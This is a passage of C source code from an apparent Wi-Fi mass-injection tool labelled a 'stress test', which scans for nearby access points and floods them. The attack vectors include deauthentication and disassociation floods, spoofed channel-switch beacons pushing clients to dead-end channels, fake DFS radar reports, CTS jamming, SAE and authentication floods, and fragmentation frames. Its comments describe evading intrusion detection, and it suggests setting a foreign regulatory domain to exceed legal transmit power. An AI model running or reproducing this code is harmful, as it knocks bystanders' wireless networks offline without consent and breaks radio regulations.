  }

  uint8_t tpl_eapol[MAX_PKT_SIZE];
  int tpl_eapol_len = 0;
  if (a->cfg->vec_on[VEC_EAPOL_LOGOFF]) {
    uint8_t dummy_bss[6] = {0};
    uint8_t dummy_cli[6] = {0};
    tpl_eapol_len = mk_eapol_logoff(tpl_eapol, dummy_bss, dummy_cli);
  }

  /* [FIX 47] PID Auto-Tuner: per-thread local state (was `static` = data race
   * on dual-radio) */
  uint64_t local_sent = 0;
  uint64_t local_fail = 0;
  uint64_t pid_last_sent = 0;
  uint64_t pid_last_fail = 0;

  while (!g_stop) {
    int nap = stress_pool_snapshot(a->pool, snap, STRESS_MAX_APS);
    if (nap == 0) {
      usleep_precise(0.5);
      continue;
    }

    
    int cur_ch = atomic_load(&g_stress_ch[a->radio_idx]);

    
    for (int i = 0; i < nap && !g_stop; i++) {
      if (snap[i].channel != cur_ch)
        continue;

      /* [UPGRADE] Dynamic Wildcard Matching */
      if (a->cfg->target_ssid_track_cnt > 0) {
        bool ssid_match = false;
        for (int j = 0; j < a->cfg->target_ssid_track_cnt; j++) {
          if (wildcard_match(a->cfg->target_ssid_track[j], snap[i].ssid)) {
            ssid_match = true;
            break;
          }
        }
        if (!ssid_match) continue;
      }

      /* [FIX] AP Pool Sharding (Multi-Threading Load Balancer) */
      if (a->band == 2 && snap[i].channel > 14)
        continue;
      if (a->band == 5 && snap[i].channel <= 14)
        continue;

      uint8_t bss[6];
      memcpy(bss, snap[i].bssid, 6);

      uint8_t tmp[MAX_PKT_SIZE];
      int len;
      int sent_for_ap = 0;

      
      if (a->cfg->vec_on[VEC_DEAUTH_FLOOD]) {
        /* [UPGRADE] Micro-Burst & PMF Baiting (WPA3 Evasion) */
        
        for (int burst = 0; burst < 3; burst++) {
            
            len = mk_deauth(tmp, bss, bss, 6, (seq++) & 0xFFF);
            if (inject_one(sock, tmp, len) > 0) {
              { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
              sent_for_ap++;
            } else {
              { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
            }

            
            len = mk_deauth(tmp, bss, bss, 7, (seq++) & 0xFFF);
            if (inject_one(sock, tmp, len) > 0) {
              { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
              sent_for_ap++;
            } else {
              { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
            }

            
            uint16_t reason = REASON_CODES[seq % N_REASONS];
            len = mk_deauth(tmp, bss, bss, reason, (seq++) & 0xFFF);
            if (inject_one(sock, tmp, len) > 0) {
              { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
              sent_for_ap++;
            } else {
              { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
            }

            
            uint8_t fake_cli[6];
            rand_mac(fake_cli);
            uint16_t rev_reason = REASON_CODES[seq % N_REASONS];
            len = mk_deauth_rev(tmp, bss, fake_cli, rev_reason, (seq++) & 0xFFF);
            if (inject_one(sock, tmp, len) > 0) {
              { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
              sent_for_ap++;
            } else {
              { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
            }
        }
      }

      if (a->cfg->vec_on[VEC_DISASSOC_FLOOD]) {
        /* [UPGRADE] Micro-Burst & PMF Baiting for Disassoc */
        for (int burst = 0; burst < 3; burst++) {
            
            len = mk_disassoc(tmp, bss, BCAST, 6, seq++);
            if (inject_one(sock, tmp, len) > 0) {
              { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
              sent_for_ap++;
            } else {
              { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
            }

            
            len = mk_disassoc(tmp, bss, BCAST, 7, seq++);
            if (inject_one(sock, tmp, len) > 0) {
              { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
              sent_for_ap++;
            } else {
              { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
            }

            
            uint16_t dis_reason = REASON_CODES[seq % N_REASONS];
            len = mk_disassoc(tmp, bss, BCAST, dis_reason, seq++);
            if (inject_one(sock, tmp, len) > 0) {
              { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
              sent_for_ap++;
            } else {
              { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
            }
        }
      }

      if (a->cfg->vec_on[VEC_EAPOL_LOGOFF]) {
        uint8_t fake_cli[6];
        rand_mac(fake_cli);
        /* [FIX 47] Zero-copy EAPOL logoff with correct offsets */
        memcpy(tpl_eapol + OFF_A1, bss, 6);      
        memcpy(tpl_eapol + OFF_A2, fake_cli, 6); 
        memcpy(tpl_eapol + OFF_A3, bss, 6);      
        if (inject_one(sock, tpl_eapol, tpl_eapol_len) > 0) {
          { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
          sent_for_ap++;
        } else {
          { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
        }
      }

      if (a->cfg->vec_on[VEC_CSA_BEACON]) {
        /* [UPGRADE] Aggressive Routing: 2.4GHz Dead-End & 5GHz DFS Blackhole */
        int redir;
        if (snap[i].channel <= 14) {
            redir = (snap[i].channel <= 6) ? 14 : 1;
        } else {
            /* [UPGRADE] 5GHz DFS Blackhole (TDWR Band, 10-min CAC) */
            redir = 128;
        }
        const char *ssid = snap[i].ssid[0] ? snap[i].ssid : "Unknown";

        /* [UPGRADE] Realistic Countdown Burst to evade WIPS, ending in 0 (immediate) */
        for (int c = 3; c >= 0; c--) {
          len = mk_csa_beacon(tmp, bss, ssid, (uint8_t)snap[i].channel,
                              (uint8_t)redir, (uint8_t)c, seq++);

          if (inject_one(sock, tmp, len) > 0) {
            { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
            sent_for_ap++;
          } else {
            { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
          }
        }
      }

      if (a->cfg->vec_on[VEC_BEACON_CONFUSION]) {
        /* [FIX 47] Beacon Confusion: rebuild per-AP to handle variable SSID
         * length */
        const char *ssid = snap[i].ssid[0] ? snap[i].ssid : "Unknown";
        len = mk_confusion_beacon(tmp, ssid, (uint8_t)snap[i].channel);
        if (inject_one(sock, tmp, len) > 0) {
          { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
          sent_for_ap++;
        } else {
          { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
        }
      }

      if (a->cfg->vec_on[VEC_PROBE_RESPONSE_CSA]) {
        /* [UPGRADE] Aggressive Routing: 2.4GHz Dead-End & 5GHz DFS Blackhole */
        int redir;
        if (snap[i].channel <= 14) {
            redir = (snap[i].channel <= 6) ? 14 : 1;
        } else {
            /* [UPGRADE] 5GHz DFS Blackhole (TDWR Band, 10-min CAC) */
            redir = 128;
        }
        const char *ssid = snap[i].ssid[0] ? snap[i].ssid : "Unknown";

        /* [UPGRADE] Realistic Countdown Burst ending in 0 */
        for (int c = 3; c >= 0; c--) {
          
          len = mk_probe_resp_csa(tmp, bss, BCAST, ssid, (uint8_t)snap[i].channel,
                                  (uint8_t)redir, (uint8_t)c, seq++);
          if (inject_one(sock, tmp, len) > 0) {
            { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
            sent_for_ap++;
          } else {
            { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
          }

          
          len = mk_probe_resp_csa(tmp, BCAST, BCAST, ssid,
                                  (uint8_t)snap[i].channel, (uint8_t)redir, (uint8_t)c, seq++);
          if (inject_one(sock, tmp, len) > 0) {
            { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
            sent_for_ap++;
          } else {
            { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
          }
          /* 3. [UPGRADE] Phantom Roaming Trap (Spoofed BSSID)
           * Creates a fake AP with the same SSID but different MAC.
           * When clients attempt to roam to it, it forces them into the trap channel. */
          uint8_t phantom_bss[6];
          rand_mac(phantom_bss);
          len = mk_probe_resp_csa(tmp, phantom_bss, BCAST, ssid,
                                  (uint8_t)snap[i].channel, (uint8_t)redir, (uint8_t)c, seq++);
          if (inject_one(sock, tmp, len) > 0) {
            { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
            sent_for_ap++;
          } else {
            { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
          }
        }
      }

      if (a->cfg->vec_on[VEC_AUTH_DOS]) {
        /* [FIX 47] Auth flood with random source MAC (zero-copy, correct
         * offsets) */
        uint8_t fake_cli[6];
        rand_mac(fake_cli);
        memcpy(tpl_auth + OFF_A1, bss, 6);      
        memcpy(tpl_auth + OFF_A2, fake_cli, 6); 
        memcpy(tpl_auth + OFF_A3, bss, 6);      
        uint16_t s_ctrl = htole16(((seq++) & 0xFFF) << 4);
        memcpy(tpl_auth + OFF_SEQ, &s_ctrl, 2); 
        if (inject_one(sock, tpl_auth, tpl_auth_len) > 0) {
          { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
          sent_for_ap++;
        } else {
          { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
        }
      }

      if (a->cfg->vec_on[VEC_CSA_ACTION]) {
        /* [UPGRADE] Aggressive Routing: 2.4GHz Dead-End & 5GHz DFS Blackhole */
        int redir;
        if (snap[i].channel <= 14) {
            redir = (snap[i].channel <= 6) ? 14 : 1;
        } else {
            /* [UPGRADE] 5GHz DFS Blackhole (TDWR Band, 10-min CAC) */
            redir = 128;
        }

        /* [UPGRADE] Realistic Countdown Burst ending in 0 */
        for (int c = 3; c >= 0; c--) {
          
          len = mk_csa_action(tmp, bss, BCAST, (uint8_t)redir, (uint8_t)c, seq++);
          if (inject_one(sock, tmp, len) > 0) {
            { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
            sent_for_ap++;
          } else {
            { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
          }

          
          len = mk_csa_action(tmp, BCAST, BCAST, (uint8_t)redir, (uint8_t)c, seq++);
          if (inject_one(sock, tmp, len) > 0) {
            { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
            sent_for_ap++;
          } else {
            { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
          }
        }
      }

      if (a->cfg->vec_on[VEC_QUIET_ELEMENT]) {
        /* [FIX 47] Quiet Beacon — rebuild per-AP (variable SSID length makes
         * template unsafe) */
        const char *ssid = snap[i].ssid[0] ? snap[i].ssid : "Unknown";
        len = mk_quiet_beacon(tmp, bss, ssid, (uint8_t)snap[i].channel);
        if (inject_one(sock, tmp, len) > 0) {
          { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
          sent_for_ap++;
        } else {
          { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
        }
      }

      if (a->cfg->vec_on[VEC_DELBA_ATTACK]) {
        /* [FIX 47] DELBA attack: iterate all 8 TIDs, alternate direction.
         * DELBA params offset = OFF_BODY + 2 (category + action) = 36 */
        uint8_t fake_cli[6];
        rand_mac(fake_cli);
        for (int tid = 0; tid < 8; tid++) {
          
          len = mk_delba(tmp, bss, BCAST);
          uint16_t params1 = htole16(0x0800 | (tid << 12));
          memcpy(tmp + OFF_BODY + 2, &params1, 2); /* [FIX 47] correct offset */
          if (inject_one(sock, tmp, len) > 0) {
            { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
            sent_for_ap++;
          } else {
            { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
          }

          
          len = mk_delba(tmp, fake_cli, bss);
          uint16_t params2 = htole16(0x0000 | (tid << 12));
          memcpy(tmp + OFF_BODY + 2, &params2, 2); /* [FIX 47] correct offset */
          if (inject_one(sock, tmp, len) > 0) {
            { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
            sent_for_ap++;
          } else {
            { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
          }
        }
      }

      if (a->cfg->vec_on[VEC_FRAGATTACK]) {
        uint8_t fake_cli[6];
        rand_mac(fake_cli);
        uint16_t fseq = (uint16_t)(xs64_next(&rng) % 4096);
        int len0 = mk_frag_setup(tmp, bss, fake_cli, fseq);
        uint8_t tmp1[MAX_PKT_SIZE];
        int len1 = mk_frag_payload(tmp1, bss, fake_cli, fseq, NULL, 0);

        if (inject_one(sock, tmp, len0) > 0) {
          { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
          sent_for_ap++;
        } else {
          { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
        }
        if (inject_one(sock, tmp1, len1) > 0) {
          { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
          sent_for_ap++;
        } else {
          { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
        }
      }

      if (a->cfg->vec_on[VEC_DFS_FAKE_RADAR]) {
        uint8_t cur = (uint8_t)snap[i].channel;
        uint8_t safe = pick_safe_ch(cur, 36);
        const char *ssid = snap[i].ssid[0] ? snap[i].ssid : "Unknown";

        /* [UPGRADE] Burst inject Measurement Reports from multiple spoofed clients */
        for (int burst = 0; burst < 3; burst++) {
          uint8_t fake_cli[6];
          rand_mac(fake_cli);
          
          len = mk_dfs_radar_report(tmp, bss, fake_cli, cur, (seq++) & 0xFF);
          if (inject_one(sock, tmp, len) > 0) {
            { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
            sent_for_ap++;
          } else {
            { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
          }
        }

        
        len = mk_dfs_vacate_csa(tmp, bss, ssid, cur, safe);
        if (inject_one(sock, tmp, len) > 0) {
          { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
          sent_for_ap++;
        } else {
          { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
        }
      }

      /* Vector #17: CTS/RTS Virtual Jammer */
      if (a->cfg->vec_on[VEC_CTS_NAV_JAMMER]) {
        
        len = mk_cts_nav(tmp, bss);
        if (inject_one(sock, tmp, len) > 0) {
          { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
          sent_for_ap++;
        } else {
          { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
        }
        
        len = mk_cts_nav(tmp, BCAST);
        if (inject_one(sock, tmp, len) > 0) {
          { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
          sent_for_ap++;
        } else {
          { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
        }
      }

      /* Vector #18: WPA3 SAE Hunting & Puzzling */
      if (a->cfg->vec_on[VEC_SAE_HUNTING]) {
        
        uint8_t fake_cli[6];
        rand_mac(fake_cli);
        uint16_t sae_groups[] = {19, 20, 21};
        len = mk_sae_commit(tmp, bss, fake_cli, sae_groups[seq % 3]);
        if (inject_one(sock, tmp, len) > 0) {
          { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
          sent_for_ap++;
        } else {
          { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
        }
      }

      /* Vector #19: BSS Transition Attack (802.11v Steer) */
      if (a->cfg->vec_on[VEC_BSS_TRANSITION]) {
        
        len = mk_bss_transition(tmp, bss, BCAST, seq++);
        if (inject_one(sock, tmp, len) > 0) {
          { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
          sent_for_ap++;
        } else {
          { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
        }
      }

      /* Vector #20: Beacon Report Drain (Battery Exploitation) */
      if (a->cfg->vec_on[VEC_BEACON_REPORT_DRAIN]) {
        
        len = mk_beacon_report_req(tmp, bss, BCAST, (uint8_t)snap[i].channel, seq++);
        if (inject_one(sock, tmp, len) > 0) {
          { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
          sent_for_ap++;
        } else {
          { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
        }
      }

      
      for (int j = 0; j < a->pool->count; j++) {
        if (memcmp(a->pool->aps[j].bssid, bss, 6) == 0) {
          __atomic_fetch_add(&a->pool->aps[j].tx_count, (uint64_t)sent_for_ap,
                             __ATOMIC_RELAXED);
          break;
        }
      }

      /* Rate Controller moved INSIDE the AP loop to prevent massive bursts
       * that overflow the kernel ring buffer and crash the firmware */
      uint64_t curr_sent = local_sent;
      uint64_t curr_fail = local_fail;

      uint64_t d_sent = curr_sent - pid_last_sent;
      uint64_t d_fail = curr_fail - pid_last_fail;

      if (d_sent + d_fail > 50) { 
        pid_last_sent = curr_sent;
        pid_last_fail = curr_fail;

        double fail_rate = (double)d_fail / (double)(d_sent + d_fail);
        
        if (fail_rate > 0.15) {
          usleep_precise(0.01); /* 10ms pause to drain */
          base_sleep *= 1.5;   
          if (base_sleep > 0.02) base_sleep = 0.02; /* 20ms max per AP */
        } else if (fail_rate > 0.02) {
          base_sleep += 0.0001;
          if (base_sleep > 0.02) base_sleep = 0.02; 
        } else {
          base_sleep *= 0.5; /* Fast recovery */
          if (base_sleep < 0.00001) base_sleep = 0.00001; 
        }
      }

      usleep_precise(base_sleep); /* Apply inter-AP dynamic sleep */
    }

    /* Yield minimally at end of channel cycle */
    usleep_precise(0.001);
  }

  close(sock);
  free(a);
  return NULL;
}

/* ---- Stress Display Thread ---- */

typedef struct {
  stress_cfg_t *cfg;
  stress_pool_t *pool;
} stress_disp_arg_t;

static void *stress_display_thread(void *arg) {
  stress_disp_arg_t *d = (stress_disp_arg_t *)arg;

  printf("\033[?25l\033[2J\033[H");
  fflush(stdout);

  while (!g_stop) {
    double elapsed = mono_time() - g_start_time;
    int h = (int)(elapsed / 3600), m = (int)(fmod(elapsed, 3600) / 60),
        s = (int)(fmod(elapsed, 60));

    uint64_t sent = atomic_load(&g_pkts_sent);
    uint64_t fail = atomic_load(&g_pkts_fail);
    double pps = elapsed > 0.05 ? (double)sent / elapsed : 0;

    int naps = atomic_load(&g_stress_aps_seen);
    int cur_ch1 = atomic_load(&g_stress_ch[0]);
    int cur_ch2 = atomic_load(&g_stress_ch[1]);

    int tw, th;
    get_term_size(&tw, &th);
    (void)tw;

    printf("\033[H");

    printf("  " C_DEEP_B
           "╔══════════════════════════════════════════════════════════╗" RST
           "\n");
    printf(
        "  ║" C_RED BLD
        "   VERITAS v4.4 — STRESS TEST (MASS INJECTION)           " RST C_DEEP_B
        "║" RST "\n");
    printf("  " C_DEEP_B
           "╠══════════════════════════════════════════════════════════╣" RST
           "\n");
    printf("  ║ " C_GRAY "IF  " RST C_CYAN "%-20s" RST "  " C_GRAY
           "MODE " RST C_RED "%-18s" RST "║\033[K\n",
           d->cfg->iface, MODE_NAMES[d->cfg->mode]);
    char ch_str[16];
    if (d->cfg->dual_radio && d->cfg->iface2[0]) {
        snprintf(ch_str, sizeof(ch_str), "%d|%d", cur_ch1, cur_ch2);
    } else {
        snprintf(ch_str, sizeof(ch_str), "%d", cur_ch1);
    }
    printf("  ║ " C_GRAY "APs " RST C_AQUA "%-4d" RST " discovered"
           "        " C_GRAY "CH " RST C_YELLOW "%-7s" RST " / " C_ICE "%-2d" RST
           "      ║\033[K\n",
           naps, ch_str, d->cfg->scan_5ghz ? N_CH_24 + N_CH_5 : N_CH_24);

    char pps_str[32];
    if (pps >= 1000)
      snprintf(pps_str, sizeof(pps_str), "%.1fK pps", pps / 1000);
    else
      snprintf(pps_str, sizeof(pps_str), "%.0f pps", pps);

    printf("  ║ " C_GRAY "TX  " RST C_AQUA "%-12lu" RST "  " C_GRAY "FAIL " RST
           "%s%-6lu" RST "  " C_GRAY "RATE " RST C_ICE "%-10s" RST "║\033[K\n",
           (unsigned long)sent, fail > 0 ? C_RED : C_GRAY, (unsigned long)fail,
           pps_str);
    printf("  ║ " C_GRAY "TIME" RST " " C_CYAN "%02d:%02d:%02d" RST
           "                                             ║\033[K\n",
           h, m, s);

    
    printf("  " C_DEEP_B
           "╠══════════════════════════════════════════════════════════╣" RST
           "\n");
    printf("  ║ " C_GRAY
           "  CH  BSSID              SSID             PWR      ENC     TX" RST
           "  ║\033[K\n");
    printf("  " C_DEEP_B
           "╠══════════════════════════════════════════════════════════╣" RST
           "\n");

    
    stress_ap_t snap[STRESS_MAX_APS];
    int nsnap = stress_pool_snapshot(d->pool, snap, STRESS_MAX_APS);

    
    for (int i = 0; i < nsnap - 1; i++)
      for (int j = i + 1; j < nsnap; j++)
        if (snap[j].channel < snap[i].channel) {
          stress_ap_t tmp = snap[i];
          snap[i] = snap[j];
          snap[j] = tmp;
        }

    int max_rows = th - 16;
    if (max_rows < 3)
      max_rows = 3;
    int show = nsnap > max_rows ? max_rows : nsnap;

    for (int i = 0; i < show; i++) {
      uint64_t atx = atomic_load(&snap[i].tx_count);
      char ssid_disp[48];
      if (snap[i].ssid[0]) {
        snprintf(ssid_disp, sizeof(ssid_disp), "%.16s", snap[i].ssid);
      } else {
        snprintf(ssid_disp, sizeof(ssid_disp), C_DIM_GRAY "<hidden>" RST);
      }

      char rssi_str[32];
      if (snap[i].rssi < 0 && snap[i].rssi > -120) {
        const char *rc = (snap[i].rssi > -60)
                             ? C_GREEN
                             : ((snap[i].rssi > -78) ? C_YELLOW : C_RED);
        snprintf(rssi_str, sizeof(rssi_str), "%s%3d dBm" RST, rc, snap[i].rssi);
      } else {
        snprintf(rssi_str, sizeof(rssi_str), C_GRAY "n/a    " RST);
      }

      char tx_str[16];
      if (atx >= 1000000)
        snprintf(tx_str, sizeof(tx_str), "%.1fM", (double)atx / 1e6);
      else if (atx >= 1000)
        snprintf(tx_str, sizeof(tx_str), "%.1fK", (double)atx / 1e3);
      else
        snprintf(tx_str, sizeof(tx_str), "%lu", (unsigned long)atx);

      const char *enc_str = snap[i].encryption[0] ? snap[i].encryption : "OPN";
      bool is_cur = (snap[i].channel == cur_ch1 || (d->cfg->dual_radio && snap[i].channel == cur_ch2));
      printf("  ║ %s%3d" RST "  %-18s %-16s %-8s %-7s %-5s ║\033[K\n",
             is_cur ? C_GREEN : C_GRAY, snap[i].channel,
             snap[i].bssid_str, ssid_disp, rssi_str, enc_str, tx_str);
    }
    if (nsnap > show)
      printf("  ║ " C_DIM_GRAY "  ... +%d more APs" RST
             "                                     ║\033[K\n",
             nsnap - show);

    printf("  " C_DEEP_B
           "╚══════════════════════════════════════════════════════════╝" RST
           "\n");
    printf("  " C_DIM_GRAY "[" C_RED "Ctrl+C" RST C_DIM_GRAY "]" RST
           " stop   " C_GRAY "APs:" RST C_AQUA "%d" RST "  " C_GRAY
           "TX:" RST C_AQUA "%lu" RST "  " C_GRAY "%s" RST "\n",
           naps, (unsigned long)sent, pps_str);
    printf("\033[J");
    fflush(stdout);

    usleep_precise(0.15);
  }

  printf("\033[?25h");
  fflush(stdout);
  free(d);
  return NULL;
}


static void export_report(const char *path, const stress_pool_t *pool,
                          double elapsed, uint64_t sent, uint64_t fail) {
  if (!path || !path[0])
    return;
  FILE *fp = fopen(path, "w");
  if (!fp) {
    fprintf(stderr,
            "  " C_RED "[!] Failed to write export report to '%s'" RST "\n",
            path);
    return;
  }

  bool is_csv = (strstr(path, ".csv") != NULL);
  if (is_csv) {
    fprintf(fp, "bssid,ssid,channel,rssi,encryption,tx_count\n");
    pthread_mutex_lock((pthread_mutex_t *)&pool->lock);
    for (int i = 0; i < pool->count; i++) {
      fprintf(fp, "\"%s\",\"%s\",%d,%d,\"%s\",%lu\n", pool->aps[i].bssid_str,
              pool->aps[i].ssid, pool->aps[i].channel, pool->aps[i].rssi,
              pool->aps[i].encryption[0] ? pool->aps[i].encryption : "OPN",
              (unsigned long)pool->aps[i].tx_count);
    }
    pthread_mutex_unlock((pthread_mutex_t *)&pool->lock);
  } else {
    
    fprintf(
        fp,
        "{\n  \"timestamp\": %ld,\n  \"elapsed_seconds\": %.1f,\n  "
        "\"pkts_sent\": %lu,\n  \"pkts_fail\": %lu,\n  \"aps_count\": %d,\n "
        " \"aps\": [\n",
        (long)time(NULL), elapsed, (unsigned long)sent, (unsigned long)fail,
        pool->count);
    pthread_mutex_lock((pthread_mutex_t *)&pool->lock);
    for (int i = 0; i < pool->count; i++) {
      fprintf(fp,
              "    {\"bssid\": \"%s\", \"ssid\": \"%s\", \"channel\": %d, "
              "\"rssi\": %d, \"encryption\": \"%s\", \"tx_count\": %lu}%s\n",
              pool->aps[i].bssid_str, pool->aps[i].ssid, pool->aps[i].channel,
              pool->aps[i].rssi,
              pool->aps[i].encryption[0] ? pool->aps[i].encryption : "OPN",
              (unsigned long)pool->aps[i].tx_count,
              (i < pool->count - 1) ? "," : "");
    }
    pthread_mutex_unlock((pthread_mutex_t *)&pool->lock);
    fprintf(fp, "  ]\n}\n");
  }
  fclose(fp);
  printf("  " C_GREEN "[✓] Audit report exported to: %s" RST "\n", path);
}

/* [FIX] Native TX-Power & Regulatory Domain Unlocker */
static void unlock_tx_power(const char *iface) {
  
  printf(
      "  " C_YELLOW
      "[!] INSANE mode detected. Note: For max performance, manually unlock TX "
      "power (e.g., iw reg set BO; iwconfig %s txpower 30) before running." RST
      "\n",
      iface);
}

/* ---- Stress Test Orchestrator ---- */

static void run_stress(stress_cfg_t *cfg) {
  printf("\n  " C_RED BLD
         "╔═══════════════════════════════════════════════╗" RST "\n");
  printf("  " C_RED BLD "║  STRESS TEST — MASS INJECTION ACTIVE          ║" RST
         "\n");
  printf("  " C_RED BLD "║  All Wi-Fi signals in range will be targeted  ║" RST
         "\n");
  printf("  " C_RED BLD "╚═══════════════════════════════════════════════╝" RST
         "\n\n");

  printf("  " C_GRAY "Interface:" RST " " C_CYAN "%s" RST "\n", cfg->iface);
  printf("  " C_GRAY "Mode:     " RST " " C_RED "%s" RST "\n",
         MODE_NAMES[cfg->mode]);
  printf("  " C_GRAY "Band:     " RST " " C_ICE "%s" RST "\n",
         cfg->scan_5ghz ? "2.4GHz + 5GHz" : "2.4GHz only");
  printf("  " C_GRAY "Vectors:  " RST " " C_AQUA "%d active" RST "\n",
         cfg->nvec);
  if (cfg->duration > 0)
    printf("  " C_GRAY "Duration: " RST " " C_YELLOW "%ds" RST "\n",
           cfg->duration);

  if (cfg->mode == MODE_INSANE) {
    unlock_tx_power(cfg->iface);
    if (cfg->dual_radio && cfg->iface2[0]) {
      unlock_tx_power(cfg->iface2);
    }
  }

  
  for (int v = 0; v < VEC_COUNT; v++) {
    if (cfg->vec_on[v])
      printf("    " C_GREEN "▸" RST " %s\n", VEC_NAMES[v]);
  }

  printf("\n  " C_RED BLD "Deploy mass injection? " RST "(y/N): ");
  fflush(stdout);
  char buf[32];
  if (!fgets(buf, sizeof(buf), stdin) || buf[0] != 'y') {
    printf("  Cancelled.\n");
    return;
  }

  printf("\n  " C_GREEN "[✓] Scanning and injecting..." RST "\n\n");

  
  stress_pool_t pool;
  stress_pool_init(&pool);

  g_stop = 0;
  g_stress_aps_seen = 0;
  g_start_time = mono_time();
  g_pkts_sent = 0;
  g_pkts_fail = 0;
  signal(SIGINT, sig_handler);
  signal(SIGTERM, sig_handler);

  
  int dwell_ms;
  switch (cfg->mode) {
  case MODE_STEALTH:
    dwell_ms = 500;
    break;
  case MODE_LOW:
    dwell_ms = 350;
    break;
  case MODE_MEDIUM:
    dwell_ms = 200;
    break;
  case MODE_HIGH:
    dwell_ms = 100;
    break;
  case MODE_INSANE:
    dwell_ms = 50;
    break;
  default:
    dwell_ms = 200;
    break;
  }

  
  pthread_t scan_t[2];
  int n_scan = 0;

  stress_scan_arg_t *sa1 = calloc(1, sizeof(*sa1));
  snprintf(sa1->iface, MAX_IFACE, "%s", cfg->iface);
  sa1->pool = &pool;
  sa1->unmask_hidden = cfg->unmask_hidden;
  sa1->radio_idx = 0;
  if (pthread_create(&scan_t[n_scan], NULL, stress_scanner_thread, sa1) == 0)
    n_scan++;
  else
    free(sa1);

  if (!cfg->split_role && cfg->dual_radio && cfg->iface2[0]) {
    stress_scan_arg_t *sa2 = calloc(1, sizeof(*sa2));
    snprintf(sa2->iface, MAX_IFACE, "%s", cfg->iface2);
    sa2->pool = &pool;
    sa2->unmask_hidden = cfg->unmask_hidden;
    sa2->radio_idx = 1;
    if (pthread_create(&scan_t[n_scan], NULL, stress_scanner_thread, sa2) == 0)
      n_scan++;
    else
      free(sa2);
  }

  
  pthread_t hop_t[2];
  int n_hop = 0;

  stress_hop_arg_t *ha1 = calloc(1, sizeof(*ha1));
  snprintf(ha1->iface, MAX_IFACE, "%s", cfg->iface);
  ha1->dwell_ms = dwell_ms;
  ha1->nch = 0;
  ha1->radio_idx = 0;

  
  
  
  if (cfg->split_role) {
      for (int i = 0; i < N_CH_24; i++) ha1->chlist[ha1->nch++] = CH_24[i];
      if (cfg->scan_5ghz) {
          for (int i = 0; i < N_CH_5; i++) ha1->chlist[ha1->nch++] = CH_5[i];
      }
  } else {
      for (int i = 0; i < N_CH_24; i++) ha1->chlist[ha1->nch++] = CH_24[i];
      if (!cfg->dual_radio && cfg->scan_5ghz) {
        for (int i = 0; i < N_CH_5; i++)
          ha1->chlist[ha1->nch++] = CH_5[i];
      }
  }

  if (pthread_create(&hop_t[n_hop], NULL, stress_hopper_thread, ha1) == 0)
    n_hop++;
  else
    free(ha1);

  if (cfg->dual_radio && cfg->iface2[0]) {
    if (cfg->split_role) {
      
      stress_hop_arg_t *ha2 = calloc(1, sizeof(*ha2));
      snprintf(ha2->iface, MAX_IFACE, "%s", cfg->iface2);
      ha2->dwell_ms = dwell_ms;
      ha2->nch = 0;
      ha2->radio_idx = 1;
      for (int i = 0; i < N_CH_24; i++) ha2->chlist[ha2->nch++] = CH_24[i];
      if (cfg->scan_5ghz) {
          for (int i = 0; i < N_CH_5; i++) ha2->chlist[ha2->nch++] = CH_5[i];
      }
      if (pthread_create(&hop_t[n_hop], NULL, stress_hopper_thread, ha2) == 0)
        n_hop++;
      else
        free(ha2);
    } else if (cfg->scan_5ghz) {
      
      stress_hop_arg_t *ha2 = calloc(1, sizeof(*ha2));
      snprintf(ha2->iface, MAX_IFACE, "%s", cfg->iface2);
      ha2->dwell_ms = dwell_ms;
      ha2->nch = 0;
      ha2->radio_idx = 1;
      for (int i = 0; i < N_CH_5; i++)
